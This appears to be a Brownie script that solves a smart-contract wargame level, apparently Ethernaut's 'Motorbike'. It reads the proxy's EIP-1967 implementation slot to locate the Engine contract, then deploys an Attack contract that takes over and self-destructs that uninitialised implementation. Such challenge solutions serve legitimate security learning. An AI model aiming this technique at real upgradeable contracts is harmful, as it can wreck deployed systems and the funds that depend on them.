from brownie import Contract, Attack, Motorbike, Engine, network, config
from scripts.helpful_scripts import get_account, LOCAL_BLOCKCHAIN_ENVIRONMENTS
from web3 import Web3


def attack():

    account = get_account()

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:

        web3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

        motorbike = Motorbike.deploy(
            Engine.deploy({"from": get_account(index=1)}),
            {"from": get_account(index=1)},
        )

        engine = (
            "0x"
            + web3.eth.get_storage_at(
                str(motorbike),
                "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc",
            ).hex()[-40:]
        )

        attack = Attack.deploy(motorbike, engine, {"from": account})

    else:

        web3 = Web3(
            Web3.HTTPProvider(
                Web3.HTTPProvider(config["networks"][network.show_active()]["infura"])
            )
        )

        motorbike = Contract.from_abi(
            Motorbike._name,
            config["networks"][network.show_active()]["motorbike"],
            Motorbike.abi,
        )

        engine = (
            "0x"
            + web3.eth.get_storage_at(
                str(motorbike),
                "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc",
            ).hex()[-40:]
        )

        attack = Attack.deploy(motorbike, engine, {"from": account})

    attack.attack({"from": account}).wait(1)

    if attack.attacked():

        attack.boom({"from": account}).wait(1)

        print(
            "Attack was successful"
            if attack.destroyed()
            else "Attack was not successful"
        )


def main():
    attack()
